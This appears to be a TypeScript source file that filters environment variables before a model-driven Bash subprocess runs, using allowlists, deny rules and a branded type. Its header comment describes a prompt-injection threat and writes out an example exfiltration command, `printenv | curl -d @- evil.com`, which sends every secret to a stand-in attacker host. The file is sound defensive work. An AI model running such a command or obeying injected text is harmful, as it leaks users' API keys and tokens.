// Env scrubbing for Bash subprocess.
//
// Threat: process.env contains every secret in the user's shell — provider
// API keys (ANTHROPIC_API_KEY, GH_TOKEN, AWS_*), CI tokens, npm publish
// tokens. Passing it untouched to a model-driven Bash means a single
// prompt-injected `printenv | curl -d @- evil.com` exfiltrates everything.
//
// Policy: deny-by-default. Subprocess only sees vars whose name is on the
// allowlist (exact name) or whose name starts with an allowed prefix.
// Users can extend either list (add their own allowed names/prefixes) or
// override (deny names/prefixes that are otherwise allowed by default).
// Deny rules win over allow rules so a user-added deny is always honored.

export interface EnvPolicy {
  allow?: string[];
  allowPrefixes?: string[];
  deny?: string[];
  denyPrefixes?: string[];
}

// Exact-match var names that are safe to forward.
//
// Notes on borderline cases:
//   SSH_AUTH_SOCK — needed for `git push` over ssh. The socket itself is the
//     credential channel; an attacker who can run subprocesses can sign with
//     it whether or not we forward this var (they'd just point ssh at it via
//     the well-known path). Forwarding doesn't materially worsen the threat.
//   EDITOR/VISUAL/PAGER — git, npm, bundler invoke these. Without them,
//     interactive subcommands break. The values are just program names.
//   NODE_ENV/NODE_PATH — sometimes load-bearing for npm scripts. NODE_OPTIONS
//     is intentionally NOT here because it can inject `--require` modules.
const DEFAULT_ALLOW: readonly string[] = [
  'PATH',
  'HOME',
  'USER',
  'LOGNAME',
  'SHELL',
  'TERM',
  'COLORTERM',
  'LANG',
  'LANGUAGE',
  'TZ',
  'PWD',
  'OLDPWD',
  'TMPDIR',
  'TMP',
  'TEMP',
  'EDITOR',
  'VISUAL',
  'PAGER',
  'DISPLAY',
  'SSH_AUTH_SOCK',
  'SSH_CONNECTION',
  'SSH_CLIENT',
  'SSH_TTY',
  'NODE_ENV',
  'NODE_PATH',
];

// Prefix-match patterns. Matches at the start of the var name; for example
// 'GIT_' matches 'GIT_AUTHOR_NAME' but not 'MYGIT_FOO'.
const DEFAULT_ALLOW_PREFIXES: readonly string[] = [
  'LC_', // locale: LC_ALL, LC_CTYPE, …
  'GIT_', // git's many knobs (GIT_AUTHOR_NAME, GIT_DIR, …)
  'XDG_', // XDG base dir spec
];

// Built-in deny that wins over any allow. These are vars whose names look
// allow-shaped (e.g. start with GIT_) but smuggle credentials. Adding to
// this list is preferable to removing the corresponding prefix from the
// allow list, which would break unrelated benign vars.
const DEFAULT_DENY: readonly string[] = [
  'GIT_ASKPASS', // can be set to a credential helper script path
  'GIT_SSH_COMMAND', // can override which ssh binary runs
  'GIT_HTTP_USER_AGENT', // some setups stuff tokens here
  'XDG_RUNTIME_DIR', // path to user's runtime dir; not a secret but
  //   lets subprocesses target ephemeral sockets
];

const DEFAULT_DENY_PREFIXES: readonly string[] = [
  'FACTORY_', // our own debug/state vars — no reason to expose
];

/** Phantom brand used to tag the `env` map produced by `sanitizeEnv`.
 *
 *  Declared as a private `unique symbol` — NOT exported. Outside this
 *  module the only way to satisfy `SanitizedEnv` is to call
 *  `sanitizeEnv` (or `extendSanitizedEnv`, which preserves the brand
 *  on a known producer). A caller writing `process.env as SanitizedEnv`
 *  works syntactically but is an explicit `as` cast — visible to any
 *  reviewer or future arch test that wants to grep for unsafe escapes.
 *
 *  Brand vs. nominal type: TypeScript erases at runtime, so this is
 *  zero-cost. The intersection makes `SanitizedEnv` assignable to every
 *  parameter that wants `NodeJS.ProcessEnv` (e.g. `child_process.spawn`)
 *  without any unwrap. The asymmetry is the only thing we need: every
 *  `SanitizedEnv` IS-A `ProcessEnv`, but not every `ProcessEnv` is a
 *  `SanitizedEnv`. */
declare const sanitizedEnvBrand: unique symbol;

/** A `NodeJS.ProcessEnv` that was produced by `sanitizeEnv` (or carried
 *  forward via `extendSanitizedEnv`).
 *
 *  The point of the brand: APIs that spawn child processes can declare
 *  their `env` parameter as `SanitizedEnv` to require — at compile time
 *  — that the value came through the env scrubber. The legacy hazard,
 *  documented in `core/hooks/AGENTS.md`, was passing `process.env`
 *  directly to a hook subprocess. With the brand a caller would have
 *  to write `spawn(..., { env: process.env as SanitizedEnv })`, which
 *  is loud enough to catch in review (and tightenable later with an
 *  arch test forbidding the cast outside `env.ts`).
 *
 *  Note that `child_process.spawn` itself accepts plain `ProcessEnv`,
 *  so the brand only helps when our own functions opt in to require
 *  `SanitizedEnv`. Today that's `extendSanitizedEnv`; the next lift
 *  would be a `spawnWithSanitizedEnv` wrapper that confines
 *  `child_process` imports to a single adapter. */
export type SanitizedEnv = NodeJS.ProcessEnv & {
  readonly [sanitizedEnvBrand]: never;
};

/** Return value of `sanitizeEnv`. `env` is branded; `dropped` lists the
 *  names of vars that were filtered out (names only, no values, so it's
 *  safe to log). */
export interface SanitizeResult {
  env: SanitizedEnv;
  dropped: string[];
}

export function sanitizeEnv(source: NodeJS.ProcessEnv, policy: EnvPolicy = {}): SanitizeResult {
  const allow = new Set([...DEFAULT_ALLOW, ...(policy.allow ?? [])]);
  const allowPrefixes = [...DEFAULT_ALLOW_PREFIXES, ...(policy.allowPrefixes ?? [])];
  const deny = new Set([...DEFAULT_DENY, ...(policy.deny ?? [])]);
  const denyPrefixes = [...DEFAULT_DENY_PREFIXES, ...(policy.denyPrefixes ?? [])];

  const env: NodeJS.ProcessEnv = {};
  const dropped: string[] = [];

  for (const [name, value] of Object.entries(source)) {
    if (value === undefined) continue;
    if (deny.has(name) || denyPrefixes.some(p => name.startsWith(p))) {
      dropped.push(name);
      continue;
    }
    if (allow.has(name) || allowPrefixes.some(p => name.startsWith(p))) {
      env[name] = value;
      continue;
    }
    dropped.push(name);
  }

  // The cast is the brand's mint site: this is the one function that
  // promotes a freshly-scrubbed map to `SanitizedEnv`. Every other
  // producer of the brand (`extendSanitizedEnv` below) chains off a
  // value this function has already produced.
  return { env: env as SanitizedEnv, dropped };
}

/** Extend a `SanitizedEnv` with additional known-safe key/value pairs
 *  (typically per-call context like `FACTORY_PROJECT_DIR`), preserving
 *  the brand.
 *
 *  Why this isn't `{ ...sanitized, ...additions }`: spread strips the
 *  phantom brand at the type level, leaving a plain `ProcessEnv` that
 *  the caller could then mix with `process.env` without anyone
 *  noticing. Routing the extension through a typed function keeps the
 *  brand in scope at every step of the path from sanitize → spawn.
 *
 *  `additions` is typed `Record<string, string>` rather than
 *  `ProcessEnv` so undefined values are a type error — there's no
 *  legitimate "add this key as undefined" case for context injection,
 *  and accepting undefined would silently no-op rather than blow up.
 *
 *  Returns a NEW object — does not mutate the caller's `env`. */
export function extendSanitizedEnv(
  env: SanitizedEnv,
  additions: Readonly<Record<string, string>>,
): SanitizedEnv {
  return { ...env, ...additions } as SanitizedEnv;
}
